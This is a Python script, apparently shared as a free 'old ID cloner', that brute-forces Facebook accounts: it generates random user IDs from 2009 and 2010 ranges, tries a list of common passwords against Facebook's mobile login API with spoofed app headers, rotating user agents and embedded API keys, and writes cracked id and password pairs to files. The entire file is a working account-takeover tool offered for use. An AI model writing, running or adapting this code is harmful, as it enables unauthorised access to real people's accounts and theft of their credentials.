import os,sys,json,uuid,string,random,requests
from concurrent.futures import ThreadPoolExecutor

class OLD_CLONER:
    def __init__(self):
        self.loop = 0 
        self.oks = []
        self.cps = []
        self.gen = []
    
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : HADI ANHAF AIMAN")
        print("GITHUB     : MR-CODE-143")
        print("FEATURE    : OLD ID CLONER")
        print("VERSION    : 1.6 FREEEEE")
        print("-------------------------------")
    
    def main(self):
        self.banner()
        print("1 -> 2009 IDS CLONE")
        print("2 -> 2010 IDS CLONE")
        print("-------------------------------")
        select = input("SELECT OPTION : ")
        if select == "1":self.oldClone("2009")
        elif select == "2":self.oldClone("2010")
        else:self.main()
    
    def oldClone(self,series):
        self.banner()
        if series == "2009":
            self.uX = "100000"
            self.uG = 9
        elif series == "2010":
            self.uX = "10000"
            self.uG = 10
        else:
            self.uX = "100000"
            self.uG = 9
        print("EXAMPLE  - 5000,10000")
        limit = int(input("SELECT   - "))
        for a in range(limit):
            aiman = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(aiman)
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            self.banner()
            print("TOTAL IDS - "+str(len(self.gen)))
            print("UID SERIES - "+series)
            print("IF NO RESULT USE FLIGHT MODE")
            print("-------------------------------")
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123","112233", "1234567890", "password", "@@@###"]
                Mr_Code.submit(self.CloneOld,ids,passlist)
        sys.exit("\n-------------------------------")
    
    def ugen(self):
        ua_list = [
        "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Republic;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1031;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
        "[FBAN/FB4A;FBAV/360.0.0.30.113;FBBV/359953991;FBDM/{density=1.5,width=1920,height=1176};FBLC/ru_RU;FBRV/362221362;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X606F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
        "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 [FBAN/FB4A;FBAV/246.0.0.49.121;FBPN/com.facebook.katana;FBLC/en_US;FBBV/238093484;FBCR/;FBMF/Google;FBBD/Pixel;FBDV/Pixel 4 XL;FBSV/10;FBCA/arm64-v8a:;FBDM/{density=3.0,width=1440,height=2960};FB_FW/1;]",
        "Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 [FBAN/FB4A;FBAV/210.0.0.41.110;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/123456789;FBCR/AT&T;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G960U;FBSV/9;FBCA/arm64-v8a:;FBDM/{density=2.0,width=1080,height=1920};FB_FW/1;]",
        "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/FB4A;FBAV/220.0.0.43.121;FBPN/com.facebook.katana;FBLC/en_US;FBBV/234578937;FBCR/Verizon;FBMF/Xiaomi;FBBD/Redmi;FBDV/Note 5 Pro;FBSV/8.1.0;FBCA/arm64-v8a:;FBDM/{density=2.75,width=1080,height=2160};FB_FW/1;]",
        "Mozilla/5.0 (Linux; Android 7.0; Samsung Galaxy S7 Edge) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/185.0.0.38.107;FBPN/com.facebook.katana;FBLC/en_US;FBBV/103525509;FBCR/Sprint;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G935F;FBSV/7.0;FBCA/arm64-v8a:;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.69",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.88 Safari/537.36 Edg/117.0.2045.47",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/102.0.4880.56",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36 OPR/101.0.4865.21",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2"]
        max = random.choice(ua_list)
        return str(max)
    
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mAIMAN-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'cpl':'true',
                'credentials_type':'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type':'button_with_disabled',
                'format':'json',
                'generate_session_cookies':'1',
                'generate_analytics_claim':'1',
                'generate_machine_id':'1',
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "locale":"en_US","client_country_code":"US",
                "device_id": str(uuid.uuid4()),
                "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                head = {
                'content-type':'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'x-fb-sim-hni':str(random.randint(20000,40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent':self.ugen(),
                'x-fb-net-hni':str(random.randint(20000,40000)),
                'x-fb-device-group': '5120',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),
                'x-fb-connection-quality':'EXCELLENT',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'x-fb-friendly-name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'accept-encoding':'gzip, deflate',
                'x-fb-http-engine':'Liger'}
                url = "https://b-graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head,verify=True).json()
                if "access_token" in response:
                    print(f"\r\r\x1b[38;5;46mOLD-OK • {ids} • {pas}")
                    open("/sdcard/AIMAN-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
                    open("/sdcard/AIMAN-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass

if __name__ == "__main__":
    OLD_CLONER().main()